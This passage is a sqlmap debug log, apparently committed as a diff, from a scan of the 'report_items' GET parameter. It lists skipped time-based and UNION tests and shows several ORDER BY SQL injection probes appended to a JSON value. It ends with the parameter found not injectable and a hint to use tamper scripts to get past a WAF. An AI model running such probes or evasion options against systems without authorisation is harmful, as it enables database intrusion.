+[16:23:53] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind - ORDER BY clause (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_LOCK.SLEEP)' because the level (3) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_PIPE.RECEIVE_MESSAGE)' because the level (3) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'HSQLDB >= 1.7.2 time-based blind - ORDER BY, GROUP BY clause (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'HSQLDB > 2.0 time-based blind - ORDER BY, GROUP BY clause (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+
+[16:23:53] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]) ORDER BY 1-- FZko
+
+[16:23:53] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}] ORDER BY 1-- fTEQ
+
+[16:23:53] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]') ORDER BY 1-- onfF
+
+[16:23:53] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]' ORDER BY 1-- LzMv
+
+[16:23:53] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}] ORDER BY 1-- mFVx
+
+[16:23:53] [DEBUG] skipping test 'Generic UNION query (random number) - 1 to 10 columns' because the level (3) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Generic UNION query (NULL) - 11 to 20 columns' because the level (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Generic UNION query (random number) - 11 to 20 columns' because the level (3) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Generic UNION query (NULL) - 21 to 30 columns' because the level (3) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Generic UNION query (random number) - 21 to 30 columns' because the level (4) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Generic UNION query (NULL) - 31 to 40 columns' because the level (4) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Generic UNION query (random number) - 31 to 40 columns' because the level (5) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Generic UNION query (NULL) - 41 to 50 columns' because the level (5) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Generic UNION query (random number) - 41 to 50 columns' because the level (5) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'MySQL UNION query (NULL) - 1 to 10 columns' because the level (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'MySQL UNION query (random number) - 1 to 10 columns' because the level (3) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'MySQL UNION query (NULL) - 11 to 20 columns' because the level (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'MySQL UNION query (random number) - 11 to 20 columns' because the level (3) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'MySQL UNION query (NULL) - 21 to 30 columns' because the level (3) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'MySQL UNION query (random number) - 21 to 30 columns' because the level (4) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'MySQL UNION query (NULL) - 31 to 40 columns' because the level (4) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'MySQL UNION query (random number) - 31 to 40 columns' because the level (5) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'MySQL UNION query (NULL) - 41 to 50 columns' because the level (5) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'MySQL UNION query (random number) - 41 to 50 columns' because the level (5) is higher than the provided (1)
+
+[16:23:53] [WARNING] GET parameter 'report_items' does not seem to be injectable
+
+[16:23:53] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next target
+
+[16:23:53] [INFO] you can find results of scanning in multiple targets mode inside the CSV file 'C:\Users\LYZ\AppData\Local\sqlmap\output\results-04082024_0423pm.csv'
+
+
+
+[*] ending @ 16:23:53 /2024-04-08/
+
